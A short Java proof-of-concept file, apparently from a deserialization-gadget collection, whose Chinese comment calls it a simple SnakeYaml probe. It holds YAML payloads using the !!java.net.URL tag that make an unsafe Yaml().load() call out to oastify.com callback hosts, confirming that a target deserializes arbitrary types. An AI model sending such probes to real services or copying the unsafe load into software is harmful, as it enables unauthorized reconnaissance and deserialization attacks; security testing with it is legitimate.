package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// 探测 SnakeYaml 的简单 PoC
public class URLScanGadget {
    public static void main(String[] args) {
        String payload = "{!!java.net.URL [\"http://ra5zf8uv32z5jnfyy18c1yiwfnle93.oastify.com/\"]: 1}";

        String testInnerClass = "{!!java.util.Map {}: 0,!!java.net.URL [\"http://5v1d0mf9ogkj410cjftqmc3a016tui.oastify.com/\"]: 1}";
        Yaml yaml = new Yaml();
        yaml.load(testInnerClass);
    }
}
